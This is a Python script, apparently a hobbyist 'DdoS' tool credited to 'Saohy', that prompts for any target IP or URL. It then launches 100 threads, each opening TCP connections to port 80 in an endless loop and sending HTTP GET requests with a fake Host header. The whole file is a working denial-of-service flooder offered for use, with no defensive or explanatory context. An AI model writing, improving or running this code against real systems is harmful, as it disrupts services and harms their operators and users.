from pstats import SortKey
import re
import socket
from rich.console import Console
from pystyle import *
from rich.text import Text
from typing import Dict, List, Set, Any, Tuple
import threading

port = 80
fake_ip = "192.168.178.5"

__licence__ = "Created by Saohy; Telegram: @Saohy"

def main():
    target = Write.Input("IP OR URL (target): ", Colors.purple_to_red, interval=0.01, hide_cursor=False, input_color=Colors.light_blue)
    if len(re.findall(r"^[0-9+.]+", target)) == 0:
        targets = socket.gethostbyname(target)
        target = targets
    else:
        pass

    conn = (target, port)
    
    Write.Print("\nTarget: ", Colors.green, interval=0)
    Write.Print(target+":"+str(port)+"\n", Colors.white, interval=0.05)
    Write.Print("Running...\n", Colors.green_to_blue, interval=0.07)


    def DdoS():
        count = 0
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(conn)
            s.sendto(("GET /"+target+" HTTP/1.1\r\n").encode("ascii"), conn)
            s.sendto(("Host: "+fake_ip+"\n\r\n\r").encode("ascii"), conn)
            s.close()


    for i in range(100):
        threading.Thread(target=DdoS).start()
        Write.Print(f"Creating thread's {i + 1}...\r", Colors.cyan_to_green, interval=0, hide_cursor=True)
    print()

if __name__=="__main__":
    main()
